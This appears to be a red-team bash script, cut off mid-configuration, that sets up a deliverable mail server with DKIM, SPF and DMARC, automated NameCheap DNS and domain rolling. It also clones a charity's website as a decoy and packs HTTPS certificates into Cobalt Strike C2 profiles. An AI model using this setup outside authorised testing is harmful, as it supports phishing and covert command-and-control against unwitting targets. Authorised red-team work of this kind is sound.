#!/bin/bash

apikeyValue="<APIKEY>"
usernameValue="<USERNAME>"
updateIP="<EXT IPaddr>"

if [[ $EUID -ne 0 ]]; then
    echo "Please run this script as root" 1>&2
    exit 1
fi

### Functions ###

function debian_initialize() {
    echo "Updating and Installing Dependicies"
    echo "deb http://ftp.debian.org/debian stretch-backports main" >> /etc/apt/sources.list
    apt-get -qq update > /dev/null 2>&1
    echo "...keep waiting..."
    apt-get -qq -y upgrade > /dev/null 2>&1
    echo -n "almost there..."
    apt-get install -qq -y nmap apache2 curl tcpdump > /dev/null 2>&1
    apt-get install -qq -y procmail dnsutils screen zip ufw > /dev/null 2>&1
    echo -n "don't be impatient..."
    apt-get remove -qq -y exim4 exim4-base exim4-config exim4-daemon-light > /dev/null 2>&1
    rm -r /var/log/exim4/ > /dev/null 2>&1

    update-rc.d nfs-common disable > /dev/null 2>&1
    update-rc.d rpcbind disable > /dev/null 2>&1

    echo "IPv6 Disabled"

    cat <<-EOF >> /etc/sysctl.conf
    net.ipv6.conf.all.disable_ipv6 = 1
    net.ipv6.conf.default.disable_ipv6 = 1
    net.ipv6.conf.lo.disable_ipv6 = 1
    net.ipv6.conf.eth0.disable_ipv6 = 1
    net.ipv6.conf.eth1.disable_ipv6 = 1
    net.ipv6.conf.ppp0.disable_ipv6 = 1
    net.ipv6.conf.tun0.disable_ipv6 = 1
EOF

    sysctl -p > /dev/null 2>&1

    echo "Changing Hostname"

    read -p "Enter your hostname (NOT FQDN): " -r primary_hostname
    read -p "Enter your hostname[.]FQDN (without brackets):  " -r primary_domain
    read -p "Enter your External IP Address (or range):  " -r extIP

    IFS="." read -ra values <<< "$primary_domain"
    dName=${values[1]}
    toplevel=${values[2]}
    extip1=$(ip a |grep -E -iv '\slo|forever|eth0:1' | grep "inet" |cut -d" " -f6 |cut -d"/" -f1)
    cat <<-EOF > /etc/hosts
127.0.1.1 $primary_hostname $primary_domain
127.0.0.1 localhost $primary_domain
EOF

    cat <<-EOF > /etc/hostname
$primary_hostname
EOF

    read -p "Are you using the NameCheap API for DNS? (y/N)" answer
    answer=${answer:-n}
    case ${answer:0:1} in
        y|Y )
            curl "https://api.namecheap.com/xml.response?ApiUser=${usernameValue}&ApiKey=${apikeyValue}&UserName=${usernameValue}&Command=namecheap.domains.dns.setHosts&ClientIp=${updateIP}&SLD=${dName}&TLD=${toplevel}&HostName1=@&RecordType1=A&Address1=${extip1}&TTL1=300"
        ;;
    esac
    ufw allow from $extIP to any > /dev/null 2>&1
    ufw allow 80/tcp > /dev/null 2>&1
    ufw allow 443/tcp > /dev/null 2>&1
    update-rc.d ufw enable > /dev/null 2>&1
    printf 'y\n' | ufw enable > /dev/null 2>&1
    echo "The System will now reboot!"
    reboot
}

function reset_firewall() {
    apt-get install iptables-persistent -q -y > /dev/null 2>&1

    iptables -F
    echo "Current iptables rules flushed"
    cat <<-ENDOFRULES > /etc/iptables/rules.v4
    *filter

    # Allow all loopback (lo) traffic and reject anything to localhost that does not originate from lo.
    -A INPUT -i lo -j ACCEPT
    -A INPUT ! -i lo -s 127.0.0.0/8 -j REJECT
    -A OUTPUT -o lo -j ACCEPT

    # Allow ping and ICMP error returns.
    -A INPUT -p icmp -m state --state NEW --icmp-type 8 -j ACCEPT
    -A INPUT -p icmp -m state --state ESTABLISHED,RELATED -j ACCEPT
    -A OUTPUT -p icmp -j ACCEPT

    # Allow SSH.
#    -A INPUT -i  eth0 -p tcp -m state --state NEW,ESTABLISHED --dport 22 -j ACCEPT
#    -A OUTPUT -o eth0 -p tcp -m state --state NEW,ESTABLISHED --sport 22 -j ACCEPT

    # Allow DNS resolution and limited HTTP/S on eth0.
    # Necessary for updating the server and keeping time.
    -A INPUT  -p udp -m state --state NEW,ESTABLISHED --sport 53 -j ACCEPT
    -A OUTPUT  -p udp -m state --state NEW,ESTABLISHED --dport 53 -j ACCEPT
    -A INPUT  -p tcp -m state --state ESTABLISHED --sport 80 -j ACCEPT
    -A INPUT  -p tcp -m state --state ESTABLISHED --sport 443 -j ACCEPT
    -A OUTPUT  -p tcp -m state --state NEW,ESTABLISHED --dport 80 -j ACCEPT
    -A OUTPUT  -p tcp -m state --state NEW,ESTABLISHED --dport 443 -j ACCEPT

    # Allow Mail Server Traffic outbound
    -A OUTPUT  -p tcp -m state --state NEW,ESTABLISHED --dport 143 -j ACCEPT
    -A OUTPUT  -p tcp -m state --state NEW,ESTABLISHED --dport 587 -j ACCEPT
    -A OUTPUT  -p tcp -m state --state NEW,ESTABLISHED --dport 993 -j ACCEPT
    -A OUTPUT  -p tcp -m state --state NEW,ESTABLISHED --dport 25 -j ACCEPT

    # Allow Mail Server Traffic inbound
    -A INPUT  -p tcp -m state --state NEW,ESTABLISHED --sport 143 -j ACCEPT
    -A INPUT  -p tcp -m state --state NEW,ESTABLISHED --sport 587 -j ACCEPT
    -A INPUT  -p tcp -m state --state NEW,ESTABLISHED --sport 993 -j ACCEPT
    -A INPUT  -p tcp -m state --state NEW,ESTABLISHED --sport 25 -j ACCEPT

    COMMIT
ENDOFRULES

    iptables -P INPUT DROP
    iptables -P FORWARD DROP
    iptables -P OUTPUT DROP

    cat <<-ENDOFRULES > /etc/iptables/rules.v6
    *filter

    -A INPUT -j DROP
    -A FORWARD -j DROP
    -A OUTPUT -j DROP

    COMMIT
ENDOFRULES

    echo "Loading new firewall rules"
    iptables-restore /etc/iptables/rules.v4
    ip6tables-restore /etc/iptables/rules.v6
    iptables -D ufw-before-input 4 2>&1
    iptables -D ufw-before-input 3 2>&1
}

function add_firewall_rule() {
    echo $'\nBefore continuing, make sure you have... \n\ttarget/host file with all your allowed hosts/ranges\n\tport file with all your allowed ports\n'
    read -p "Enter your server IP address: " -r ipaddr
    tgtsfile="/root/hosts.txt"
    prtsfile="/root/ports.txt"
    read -e -i "$tgtsfile" -p "Enter ALLOWED host file [full path]: " -r targetsfile
    read -e -i "$prtsfile" -p "Enter ALLOWED port file [full path]: " -r portsfile
    echo $'\n'
    targetsfile="${targetsfile:-$tgtsfile}"
    portsfile="${portsfile:-$prtsfile}"
    printf 'y\n' | ufw enable > /dev/null 2>&1
    for host in $(cat $targetsfile)
        do for portno in $(cat $portsfile)
            do ufw allow proto tcp from $host to $ipaddr port $portno > /dev/null 2>&1
        done
    done
    ufw status numbered
}

function install_ssl_Cert() {
    if [ -d "/opt/letsencrypt/" ]
        then 
        echo $'\n';echo "[ + ] LetsEncrypt already installed.  ";echo $'\n'
        printf 'y\n' | ufw enable > /dev/null 2>&1
        ufw allow 80/tcp > /dev/null 2>&1
        ufw allow 443/tcp > /dev/null 2>&1
        else 
        echo $'\nPlease be patient as we download any necessary files...'
        service apache2 stop
        apt-get update > /dev/null 2>&1
        apt-get install -y python-certbot-apache -t stretch-backports > /dev/null 2>&1
        git clone https://github.com/certbot/certbot.git /opt/letsencrypt > /dev/null 2>&1
    fi

    cd /opt/letsencrypt
    letsencryptdomains=()
    end="false"
    i=0
    read -p "Would you like to setup a wildcard SSL cert? (y/N)" answer
    answer=${answer:-n}
    case ${answer:0:1} in
        y|Y )
            cd /opt/letsencrypt

            echo $'\n[!]\tThis script creates a wildcard certificate for all subdomains to your domain'
            echo $'\n[!]\tJust enter your core domain name (e.g. github.com)'
            echo $'\n'
            read -p "Enter your server's domain:  " -r domain

            command="./certbot-auto certonly --manual --register-unsafely-without-email --agree-tos --preferred-challenges dns -d '${domain},*.${domain}'"
            eval $command
            printf 'y\n' | ufw enable > /dev/null 2>&1
        ;;
        * )
            
            echo $'\nRemember to make records for both \twww.FQDN\tand\tFQDN\n'
            
            while [ "$end" != "true" ]
            do
                read -p "Enter your server's domain or done to exit: " -r domain
                if [ "$domain" != "done" ]
                then
                    letsencryptdomains[$i]=$domain
                else
                    end="true"
                fi
                ((i++))
            done
            command="./certbot-auto certonly --standalone "
            for i in "${letsencryptdomains[@]}";
                do
                    command="$command -d $i"
                done
            command="$command -n --register-unsafely-without-email --agree-tos"
            eval $command
            printf 'y\n' | ufw enable > /dev/null 2>&1
        ;;
    esac
}

function install_postfix_dovecot() {
    printf 'y\n' | ufw enable > /dev/null 2>&1
    ufw allow 587/tcp > /dev/null 2>&1
    ufw allow 993/tcp > /dev/null 2>&1
    ufw allow 25/tcp > /dev/null 2>&1
    password=$(openssl rand -hex 10 | base64)
    adduser mailarchive --quiet --disabled-password --shell /usr/sbin/nologin --gecos "" > /dev/null 2>&1
    echo "mailarchive:${password}" | chpasswd > /dev/null 2>&1
    password2=$(openssl rand -hex 10 | base64)
    adduser mailcheck --quiet --disabled-password --shell /usr/sbin/nologin --gecos "" > /dev/null 2>&1
    echo "mailcheck:${password2}" | chpasswd > /dev/null 2>&1
    echo $'\nInstalling Dependicies\n'
    apt-get install -qq -y dovecot-common dovecot-imapd dovecot-lmtpd
    apt-get install -qq -y postfix postgrey postfix-policyd-spf-python
    apt-get install -qq -y opendkim opendkim-tools
    apt-get install -qq -y opendmarc
    apt-get install -qq -y mailutils
    echo $'\n[ ] We use the "mailarchive" account to archive sent emails.\n'
    echo $'###################################################################'                                                                 #'
    echo "# [ + ] 'mailarchive' password is:  ${password}  #"
    echo $'###################################################################\n'
    echo $'\n[ ] We use the "mailcheck" account to verify any email problems.\n'
    echo $'###################################################################'                                                                 #'
    echo "# [ + ] 'mailcheck' password is:  ${password2}   #"
    echo $'###################################################################\n'
    read -p "Enter your mail server's domain (everything after the '@' sign): " -r primary_domain
    echo $'\n'
    read -p "Enter IP's to allow Relay (if none just hit enter): " -r relay_ip
    echo $'\n[ ] Configuring Postfix'

    cat <<-EOF > /etc/postfix/main.cf
smtpd_banner = \$myhostname ESMTP \$mail_name (Debian/GNU)
biff = no
append_dot_mydomain = no
readme_directory = no
smtpd_tls_cert_file=/etc/letsencrypt/live/${primary_domain}/fullchain.pem
smtpd_tls_key_file=/etc/letsencrypt/live/${primary_domain}/privkey.pem
smtpd_tls_security_level = may
smtp_tls_security_level = may
smtpd_tls_protocols = !SSLv2, !SSLv3
smtpd_tls_session_cache_database = btree:\${data_directory}/smtpd_scache
smtp_tls_session_cache_database = btree:\${data_directory}/smtp_scache
smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination
myhostname = ${primary_domain}
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
myorigin = ${primary_domain}
mydestination = ${primary_domain}, localhost.com, , localhost
relayhost =
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 ${relay_ip}
mailbox_command = procmail -a "\$EXTENSION"
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = ipv4
milter_default_action = accept
milter_protocol = 6
smtpd_milters = inet:12301,inet:localhost:54321
non_smtpd_milters = inet:12301,inet:localhost:54321
disable_vrfy_command = yes
smtp_tls_note_starttls_offer = yes
always_bcc = mailarchive@${primary_domain}
smtpd_discard_ehlo_keyword_address_maps = cidr:/etc/postfix/esmtp_access
notify_classes = bounce, delay, policy, protocol, resource, software
bounce_notice_recipient = mailcheck
delay_notice_recipient = mailcheck
error_notice_recipient = mailcheck
EOF

    cat <<-EOF >> /etc/postfix/esmtp_access
# Allow DSN requests from local subnet only
192.168.0.0/16  silent-discard
172.16.0.0/16   silent-discard
0.0.0.0/0   silent-discard, dsn
::/0        silent-discard, dsn
EOF

    cat <<-EOF >> /etc/postfix/master.cf
submission inet n       -       -       -       -       smtpd
  -o syslog_name=postfix/submission
  -o smtpd_tls_wrappermode=no
  -o smtpd_tls_security_level=encrypt
  -o smtpd_sasl_auth_enable=yes
  -o smtpd_recipient_restrictions=permit_mynetworks,permit_sasl_authenticated,reject_unauth_destination
  -o smtpd_sender_restrictions=reject_unknown_sender_domain
  -o milter_macro_daemon_name=ORIGINATING
  -o smtpd_sasl_type=dovecot
  -o smtpd_sasl_path=private/auth
EOF

    echo "Configuring Opendkim"

    mkdir -p "/etc/opendkim/keys/${primary_domain}"
    cp /etc/opendkim.conf /etc/opendkim.conf.orig

    cat <<-EOF > /etc/opendkim.conf
    domain                              *
    AutoRestart                     Yes
    AutoRestartRate             10/1h
    Umask                                   0002
    Syslog                              Yes
    SyslogSuccess                   Yes
    LogWhy                              Yes
    Canonicalization            relaxed/simple
    ExternalIgnoreList      refile:/etc/opendkim/TrustedHosts
    InternalHosts                   refile:/etc/opendkim/TrustedHosts
    KeyFile                             /etc/opendkim/keys/${primary_domain}/mail.private
    Selector                            mail
    Mode                                    sv
    PidFile                             /var/run/opendkim/opendkim.pid
    SignatureAlgorithm      rsa-sha256
    UserID                              opendkim:opendkim
    Socket                              inet:12301@localhost
EOF

    cat <<-EOF > /etc/opendkim/TrustedHosts
127.0.0.1
localhost
${primary_domain}
${relay_ip}
EOF

    cd "/etc/opendkim/keys/${primary_domain}" || exit
    opendkim-genkey -b 1024 -s mail -d "${primary_domain}"
    echo 'SOCKET="inet:12301"' >> /etc/default/opendkim
    chown -R opendkim:opendkim /etc/opendkim

    echo "Configuring opendmarc"

    cat <<-EOF > /etc/opendmarc.conf
AuthservID ${primary_domain}
PidFile /var/run/opendmarc/opendmarc.pid
RejectFailures false
Syslog true
TrustedAuthservIDs ${primary_domain}
Socket  inet:54321@localhost
UMask 0002
UserID opendmarc:opendmarc
IgnoreHosts /etc/opendmarc/ignore.hosts
HistoryFile /var/run/opendmarc/opendmarc.dat
EOF

    mkdir "/etc/opendmarc/"
    echo "localhost" > /etc/opendmarc/ignore.hosts
    chown -R opendmarc:opendmarc /etc/opendmarc

    echo 'SOCKET="inet:54321"' >> /etc/default/opendmarc

    echo "Configuring Dovecot"

    cat <<-EOF > /etc/dovecot/dovecot.conf
log_path = /var/log/dovecot.log
auth_verbose=yes
auth_debug=yes
auth_debug_passwords=yes
mail_debug=yes
verbose_ssl=yes
disable_plaintext_auth = no
mail_privileged_group = mail
mail_location = mbox:~/mail:INBOX=/var/mail/%u

userdb {
  driver = passwd
}

passdb {
  args = %s
  driver = pam
}

protocols = " imap"

protocol imap {
  mail_plugins = " autocreate"
}

plugin {
  autocreate = Trash
  autocreate2 = Sent
  autosubscribe = Trash
  autosubscribe2 = Sent
}

service imap-login {
  inet_listener imap {
    port = 0
  }
  inet_listener imaps {
    port = 993
  }
}

service auth {
  unix_listener /var/spool/postfix/private/auth {
    group = postfix
    mode = 0660
    user = postfix
  }
}

ssl=required
ssl_cert = </etc/letsencrypt/live/${primary_domain}/fullchain.pem
ssl_key = </etc/letsencrypt/live/${primary_domain}/privkey.pem
EOF

    cat <<-EOF > /etc/pam.d/imap
#%PAM-1.0
auth    required        pam_unix.so nullok
account required        pam_unix.so
EOF

    cat <<-EOF > /etc/logrotate.d/dovecot
# dovecot SIGUSR1: Re-opens the log files.
/var/log/dovecot*.log {
  missingok
  notifempty
  delaycompress
  sharedscripts
  postrotate
    /bin/kill -USR1 `cat /var/run/dovecot/master.pid 2>/dev/null` 2> /dev/null || true
  endscript
}
EOF

#    read -p "What user would you like to assign to recieve email for root: " -r user_name
#    echo "${user_name}: root" >> /etc/aliases
#    echo "root email assigned to ${user_name}"

    echo "Restarting Services"
    service postfix restart
    service opendkim restart
    service opendmarc restart
    service dovecot restart

    echo "Checking Service Status"
    service postfix status
    service opendkim status
    service opendmarc status
    service dovecot status
    printf 'y\n' | ufw enable > /dev/null 2>&1
}

function always_https() {
    mkdir -p /var/www/html/donate > /dev/null 2>&1
    mkdir -p /var/www/html/archive > /dev/null 2>&1
    cd /var/www/html/
    wget -l 1 -O index.html https://blog.charitywater.org/ > /dev/null 2>&1
    cd /var/www/html/donate
    wget -l 1 -O index.html https://blog.charitywater.org/donate > /dev/null 2>&1
    cd /var/www/html/archive
    wget -l 1 -O index.html https://blog.charitywater.org/archive > /dev/null 2>&1
    read -p 'What is your URL (www.example.com)?  ' -r webaddr
    a2enmod rewrite
    service apache2 stop > /dev/null
    a2enmod ssl > /dev/null
    a2enmod headers > /dev/null
    a2enmod http2 > /dev/null
    cd /etc/apache2/sites-enabled/
    a2dissite 000-default > /dev/null 2>&1
    a2dissite default-ssl > /dev/null 2>&1
    a2dissite 000-default.conf > /dev/null 2>&1
    a2dissite default-ssl.conf > /dev/null 2>&1
    if [ ! -f /etc/apache2/sites-available/000-default.conf-bkup ];
        then echo "[ - ] backing-up 000-default.conf"; 
        cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/000-default.conf-bkup;
        else echo "[ / ] 000-default.conf already backed up at some point"; 
    fi
    if [ ! -f /etc/apache2/sites-available/default-ssl.conf-bkup ];
        then printf "[ - ] backing-up default-ssl.conf"; 
        cp /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-available/default-ssl.conf-bkup; 
    else echo "[ / ] default-ssl.conf already backed up at some point"
    fi

    cat <<-EOF > /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html
    <Directory "/var/www/html">
        AllowOverride All
    </Directory>
    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
EOF
    echo "[ + ]  Writing SSL config file"
    cat <<-EOF > /etc/apache2/sites-available/default-ssl.conf
<IfModule mod_ssl.c>
    <VirtualHost _default_:443>
        <Directory "/var/www/html">
        AllowOverride All
        </Directory>
        Protocols h2 http/1.1
        Header always set X-Frame-Options "SAMEORIGIN"
        Header always set Access-Control-Allow-Origin "*"
        Header always set X-Xss-Protection "1; mode=block"
        Header always set X-Content-Type-Options "nosniff"
        Header always set Feature-Policy "speaker *"
        RequestHeader set X-HTTPS 1
            Header set Referrer-Policy "no-referrer-when-downgrade"
        Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog \${APACHE_LOG_DIR}/error.log
        CustomLog \${APACHE_LOG_DIR}/access.log combined
        SSLEngine on
        SSLProtocol +TLSv1.1 +TLSv1.2 -SSLv2 -SSLv3
        SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
        SSLCertificateFile /etc/letsencrypt/live/${webaddr}/cert.pem
        SSLCertificateKeyFile /etc/letsencrypt/live/${webaddr}/privkey.pem
        SSLCertificateChainFile /etc/letsencrypt/live/${webaddr}/chain.pem
        <FilesMatch "\.(cgi|shtml|phtml|php)$">
            SSLOptions +StdEnvVars
        </FilesMatch>
        <Directory /usr/lib/cgi-bin>
            SSLOptions +StdEnvVars
        </Directory>
    </VirtualHost>
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
EOF
    echo "[ + ]  Creating HTACCESS file with REWRITE rules"
    cat <<-EOF > /var/www/html/.htaccess
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{HTTPS} !=on
    RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301] 
</IfModule>
EOF
    cd /var/www/ && chown -R www-data:www-data html/ > /dev/null 2>&1
    cd /etc/apache2/sites-available/
    echo "[ + ]  Restarting Apache2"
    service apache2 start > /dev/null
    echo "[ + ]  Enabling HTTP-S site"
    a2ensite default-ssl.conf > /dev/null
    echo "[ + ]  Enabling HTTP site"
    a2ensite 000-default.conf > /dev/null
    echo "[ + ]  Restarting Apache2"
    service apache2 reload > /dev/null
    sleep 3
    if [ $(lsof -nPi | grep -i apache | grep -c ":443 (LISTEN)") -ge 1 ]; 
        then echo '[+] Apache2 SSL is running!'
    fi
    printf 'y\n' | ufw enable > /dev/null 2>&1
}

function httpsc2doneright(){
    echo -n "NOTE:  Traffic profiles should only be added to https communications!"
    echo ""
    read -p "Enter your DNS (A) record for domain [ENTER]: " -r domain
    echo ""
    read -p "Enter your common password to be used [ENTER]: " -r password
    echo ""
    cslocation="/root/cobaltstrike"
    read -e -i "$cslocation" -p "Enter the folder-path to cobaltstrike [ENTER]: " -r cobaltStrike
    cobaltStrike="${cobaltStrike:-$cslocation}"
    echo

    domainPkcs="$domain.p12"
    domainStore="$domain.store"
    cobaltStrikeProfilePath="$cobaltStrike/httpsProfile"

    cd /etc/letsencrypt/live/$domain
    echo '[Starting] Building PKCS12 .p12 cert.'
    openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out $domainPkcs -name $domain -passout pass:$password
    echo '[Success] Built $domainPkcs PKCS12 cert.'
    echo '[Starting] Building Java keystore via keytool.'
    keytool -importkeystore -deststorepass $password -destkeypass $password -destkeystore $domainStore -srckeystore $domainPkcs -srcstoretype PKCS12 -srcstorepass $password -alias $domain
    echo '[Success] Java keystore $domainStore built.'
    mkdir $cobaltStrikeProfilePath
    cp $domainStore $cobaltStrikeProfilePath
    echo '[Success] Moved Java keystore to CS profile Folder.'
    cd $cobaltStrikeProfilePath
    echo '[Starting] Cloning into amazon.profile for testing.'
    wget https://raw.githubusercontent.com/rsmudge/Malleable-C2-Profiles/master/normal/amazon.profile --no-check-certificate -O amazon.profile
    wget https://raw.githubusercontent.com/rsmudge/Malleable-C2-Profiles/master/normal/ocsp.profile --no-check-certificate -O ocsp.profile    
    echo '[Success] ocsp.profile clonned.'
    echo '[Starting] Adding java keystore / password to amazon.profile.'
    echo " " >> amazon.profile
    echo 'https-certificate {' >> amazon.profile
    echo   set keystore \"$domainStore\"\; >> amazon.profile
    echo   set password \"$password\"\; >> amazon.profile
    echo '}' >> amazon.profile
    echo '[Success] amazon.profile updated with HTTPs settings.'
    echo '[Starting] Adding java keystore / password to oscp.profile.'
    echo " " >> ocsp.profile
    echo 'https-certificate {' >> ocsp.profile
    echo   set keystore \"$domainStore\"\; >> ocsp.profile
    echo   set password \"$password\"\; >> ocsp.profile
    echo '}' >> ocsp.profile
    echo '[Success] ocsp.profile updated with HTTPs settings.'

}

function get_dns_entries() {
    extip=$(ip a |grep -E -iv '\slo|forever|eth0:1' | grep "inet" |cut -d" " -f6 |cut -d"/" -f1)
    domain=$(ls /etc/opendkim/keys/ | head -1)
    fields=$(echo "${domain}" | tr '.' '\n' | wc -l)
    dkimrecord=$(cut -d '"' -f 2 "/etc/opendkim/keys/${domain}/mail.txt" | tr -d "[:space:]")
    # dName=$( cat /etc/hosts | cut -d"." -f5 | uniq )
    # toplevel=$( cat /etc/hosts | cut -d"." -f6 | uniq )
    # fulldomain=$( cat /etc/hosts | cut -d"." -f5-7 | uniq )
    dkim2=$( echo ${dkimrecord} | sed -r 's/\+/\%2B/g' | sed -r 's/\=/\%3D/g' | sed -r 's/\;/\%3B/g' | sed -r 's/\//\%2F/g' )
    dmarcTemp0="v=DMARC1; p=reject"
    dmarcTemp1=$( echo ${dmarcTemp0} | sed -r 's/\=/\%3D/g' | sed -r 's/\;/\%3B/g' | sed -r 's/\ /\%20/g' )

    if [[ $fields -eq 2 ]]; then
        fulldomain=$( cat /etc/hosts | cut -d"." -f5-6 | uniq )
        dName=$( cat /etc/hosts | cut -d"." -f5 | uniq )
        toplevel=$( cat /etc/hosts | cut -d"." -f6 | uniq )
        cat <<-EOF > dnsentries.txt
        DNS Entries for ${domain}:

        ====================================================================
        Namecheap - Enter under Advanced DNS

        Record Type: A
        Host: @
        Value: ${extip}
        TTL: 5 min

        Record Type: TXT
        Host: @
        Value: v=spf1 ip4:${extip} -all
        TTL: 5 min

        Record Type: TXT
        Host: mail._domainkey
        Value: ${dkimrecord}
        TTL: 5 min

        Record Type: TXT
        Host: ._dmarc
        Value: v=DMARC1; p=reject
        TTL: 5 min

        Change Mail Settings to Custom MX and Add New Record
        Record Type: MX
        Host: @
        Value: ${domain}
        Priority: 10
        TTL: 5 min
EOF
        read -p "Are you using the NameCheap API for DNS? (y/N)" answer
        answer=${answer:-n}
        case ${answer:0:1} in
            y|Y )
                curl -v "https://api.namecheap.com/xml.response?ApiUser=${usernameValue}&ApiKey=${apikeyValue}&UserName=${usernameValue}&Command=namecheap.domains.dns.setHosts&ClientIp=${updateIP}&SLD=${dName}&TLD=${toplevel}&HostName1=@&RecordType1=A&Address1=${extip}&TTL1=300&HostName2=www&RecordType2=A&Address2=${extip}&TTL2=300&HostName3=mail&RecordType3=A&Address3=${extip}&TTL3=300&HostName4=@&RecordType4=MX&Address4=${fulldomain}&TTL4=300&MXPref4=10&EmailType=MX&HostName5=@&RecordType5=TXT&Address5=v=spf1+ip4:${extip}%20-all&TTL5=300&HostName6=mail._domainkey&RecordType6=TXT&Address6=${dkim2}&TTL6=300&HostName7=._dmarc&RecordType7=TXT&Address7=${dmarcTemp1}&TTL7=300&HostName8=temp&RecordType8=A&Address8=${extip}&TTL8=60"
                cat dnsentries.txt
            ;;
            * )
                cat dnsentries.txt
            ;;
        esac
    else
        fulldomain=$( cat /etc/hosts | cut -d"." -f6-7 | uniq )
        dName=$( cat /etc/hosts | cut -d"." -f6 | uniq )
        toplevel=$( cat /etc/hosts | cut -d"." -f7 | uniq )
        namehost=$( cat /etc/hostname | grep -E -iv "localhost|127.0.0.1" )
        prefix=$( echo "${domain}" | rev | cut -d '.' -f 3- | rev )
        cat <<-EOF > dnsentries.txt
        DNS Entries for ${domain}:

        ====================================================================
        Namecheap - Enter under Advanced DNS

        Record Type: A
        Host: ${prefix}
        Value: ${extip}
        TTL: 5 min

        Record Type: A
        Host: ${namehost}
        Value: ${extip}
        TTL: 5 min

        Record Type: TXT
        Host: ${prefix}
        Value: v=spf1 ip4:${extip} -all
        TTL: 5 min

        Record Type: TXT
        Host: mail._domainkey.${prefix}
        Value: ${dkimrecord}
        TTL: 5 min

        Record Type: TXT
        Host: ._dmarc.${prefix}
        Value: v=DMARC1; p=reject
        TTL: 5 min

        Change Mail Settings to Custom MX and Add New Record
        Record Type: MX
        Host: ${prefix}
        Value: ${domain}
        Priority: 10
        TTL: 5 min
EOF
        read -p "Are you using the NameCheap API for DNS? (y/N)" answer
        answer=${answer:-n}
        case ${answer:0:1} in
            y|Y )
                curl -v "https://api.namecheap.com/xml.response?ApiUser=${usernameValue}&ApiKey=${apikeyValue}&UserName=${usernameValue}&Command=namecheap.domains.dns.setHosts&ClientIp=${updateIP}&SLD=${dName}&TLD=${toplevel}&HostName1=@&RecordType1=A&Address1=${extip}&TTL1=300&HostName2=${prefix}&RecordType2=A&Address2=${extip}&TTL2=300&HostName3=mail.${prefix}&RecordType3=A&Address3=${extip}&TTL3=300&HostName4=${prefix}&RecordType4=MX&Address4=${fulldomain}&TTL4=300&MXPref4=10&EmailType=MX&HostName5=${prefix}&RecordType5=TXT&Address5=v=spf1+ip4:${extip}%20-all&TTL5=300&HostName6=mail._domainkey.${prefix}&RecordType6=TXT&Address6=${dkim2}&TTL6=300&HostName7=._dmarc.${prefix}&RecordType7=TXT&Address7=${dmarcTemp1}&TTL7=300&HostName8=temp&RecordType8=A&Address8=${extip}&TTL8=60&HostName9=${namehost}&RecordType9=A&Address9=${extip}&TTL9=300"
                cat dnsentries.txt
            ;;
            * )
                cat dnsentries.txt
            ;;
        esac
    fi

}

function roll_domain() {
    read -p '  Your NEW Domain (everything after the @ sign):  ' -r newDomain
    mkdir -p /etc/opendkim/old-keys/
    cp -a /etc/opendkim/keys/* /etc/opendkim/old-keys/
    rm -rf /etc/opendkim/keys/*
    mkdir -p "/etc/opendkim/keys/${newDomain}"
    cd "/etc/opendkim/keys/${newDomain}" || exit
    opendkim-genkey -b 1024 -s mail -d "${newDomain}"

    cat <<-EOF > /etc/opendkim.conf
domain                              *
AutoRestart                     Yes
AutoRestartRate             10/1h
Umask                                   0002
Syslog                              Yes
SyslogSuccess                   Yes
LogWhy                              Yes
Canonicalization            relaxed/simple
ExternalIgnoreList      refile:/etc/opendkim/TrustedHosts
InternalHosts                   refile:/etc/opendkim/TrustedHosts
KeyFile                             /etc/opendkim/keys/${newDomain}/mail.private
Selector                            mail
Mode                                    sv
PidFile                             /var/run/opendkim/opendkim.pid
SignatureAlgorithm      rsa-sha256
UserID                              opendkim:opendkim
Socket                              inet:12301@localhost
EOF


    cat <<-EOF > /etc/opendmarc.conf
AuthservID ${newDomain}
PidFile /var/run/opendmarc/opendmarc.pid
RejectFailures false
Syslog true
TrustedAuthservIDs ${newDomain}
Socket  inet:54321@localhost
UMask 0002
UserID opendmarc:opendmarc
IgnoreHosts /etc/opendmarc/ignore.hosts
HistoryFile /var/run/opendmarc/opendmarc.dat
EOF

    cat <<-EOF > /etc/hostname
127.0.0.1
localhost
${newDomain}

EOF
    echo "${newDomain}" > /etc/mailname

    cat <<-EOF > /etc/hosts
127.0.1.1 mail mail.${newDomain}
127.0.0.1 localhost mail.${newDomain}
EOF

    cat <<-EOF > /etc/opendkim/TrustedHosts
127.0.1.1
localhost 
${newDomain}
EOF

    chown -R opendkim:opendkim /etc/opendkim/

    cat <<-EOF > /etc/postfix/main.cf
smtpd_banner = $myhostname ESMTP $mail_name (Debian/GNU)
biff = no
append_dot_mydomain = no
readme_directory = no
smtpd_tls_cert_file=/etc/letsencrypt/live/${newDomain}/fullchain.pem
smtpd_tls_key_file=/etc/letsencrypt/live/${newDomain}/privkey.pem
smtpd_tls_security_level = may
smtp_tls_security_level = may
smtpd_tls_protocols = !SSLv2, !SSLv3
smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination
myhostname = ${newDomain}
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
myorigin = ${newDomain}
mydestination = ${newDomain}, localhost.com, , localhost
relayhost =
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 
mailbox_command = procmail -a "$EXTENSION"
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = ipv4
milter_default_action = accept
milter_protocol = 6
